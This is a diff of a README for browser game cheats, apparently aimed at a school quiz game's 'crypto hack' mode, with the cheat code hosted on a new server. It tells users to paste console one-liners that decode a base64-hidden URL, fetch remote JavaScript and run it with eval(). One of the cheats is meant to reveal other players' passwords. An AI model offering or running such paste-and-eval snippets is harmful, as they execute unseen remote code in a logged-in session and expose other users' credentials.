@@ -10,12 +10,12 @@ This cheat only works in crypto hack game mode!
 
 Open console (ctrl + shift + j) and paste the following:
 ```js
-fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L2NyeXB0b0dldENyeXB0by5qcw==')).then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jcnlwdG9HZXRDcnlwdG8uanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
 ```
 
 # getOtherUsersPassword.js
 
 Open console (ctrl + shift + j) and paste the following:
 ```js
-fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2NyeXB0b0hhY2tQYXNzd29yZHMuanM=')).then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jcnlwdG9HZXRPdGhlcnNQYXNzd29yZHMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
 ```
